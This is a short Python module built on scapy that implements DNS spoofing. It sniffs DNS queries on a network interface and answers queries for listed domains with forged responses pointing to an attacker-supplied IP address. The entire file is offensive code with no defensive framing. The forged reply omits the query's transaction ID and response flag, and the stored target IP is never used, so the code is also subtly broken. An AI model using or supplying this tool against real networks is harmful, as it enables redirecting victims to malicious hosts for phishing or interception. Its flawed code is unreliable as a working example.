from scapy.all import *

class DNSSpoofModule:
    def __init__(self, interface, target_ip, spoof_ip):
        self.interface = interface
        self.target_ip = target_ip
        self.spoof_ip = spoof_ip
    
    def spoof_dns(self):
        def handle_packet(pkt):
            if DNSQR in pkt:
                qname = pkt[DNSQR].qname.decode()
                if any(domain in qname for domain in ['example.com', 'target.com']):
                    spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                                  UDP(dport=pkt[UDP].sport, sport=53) / \
                                  DNS(rd=1, qd=pkt[DNS].qd, an=DNSRR(rrname=qname, ttl=10, rdata=self.spoof_ip))
                    send(spoofed_pkt, verbose=0)
        
        sniff(iface=self.interface, prn=handle_packet, filter="udp port 53")